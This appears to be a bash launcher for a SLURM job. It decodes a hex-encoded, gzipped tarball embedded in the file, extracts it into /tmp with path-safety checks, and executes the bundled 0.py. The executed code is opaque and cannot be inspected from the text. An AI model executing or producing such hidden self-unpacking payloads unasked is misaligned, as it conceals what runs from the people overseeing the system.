#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d6fdb300c867bf6af1072910d048afceda4c871f71db65d86a2606c3a519ad886a4accd86fdf74976506428b05bdb0de363c0b26cf1a5448ab2147bd37737af8a7414528ead7cd9ca34cd9e9fa7f7455994374cbeeeb4264ec682762edfc2d75fc88f99ed1fb09badd80c36324ed22c2fca6a399bb3d900e7430fcdbdd94192177e44962698244599571b59e68d1bb94cd2650eb8a964e19a3cadcb4dd334459364592cb14cb0ca0a0059419dc480d7aa9bb345e344f32c89ab32f15f0ed05d395be63948192fabbcc4b282a2ad31d924800d244d53d725c6359645b2acd2a28ef33687384fe3a2c5365eba2b6d673fdf3bb6ff02520ce757f7f1e7fa8fe3f845fd67594af5ff16a8e3d06bcbccd9ccfd8f60be03b33ba8cddc05a555070c5add1fd900d6bf6497c11f5d37d06bdf84ce5080de7efb1adf45b7f5da6b085fdf260cf582cbf1efc223a1d195bcc5271b46510093295f0cbadf636d17757f3c9e3a65cf8bfdfe8ca76ecba345fd958f2713bff33276fb9d07600c3af797298ae9a80861121fcf13a72e76f8d4a82d1ae76abd762abf1f63fc2e785476c72eeb13fd805d081103c3ec2a606daf1932d58d1da65ad6f596a1e8e088c26f146bbc75c87b5def4037f7bb582e78b4aafbceaaee84d736ca780761c49c2417827bd571dd935c24062fb7d2a00cb22f7038e107ad7b1df2cf9d81d64f6238591e39c961ed4239f0c564783b784becac383e344a8753c7ac3fe913cef149197bdf3f8cbdc80d7dd4cae2253856b80468a8ed38319cb2e213e293e8732c54e7231ccab9b13a1c9dbaafe316b85ab0d8f7cf5be108aa0bfc2dd451f0de7b9920088220088220088220088220088220088220088220fe577e018f1bbc5100280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
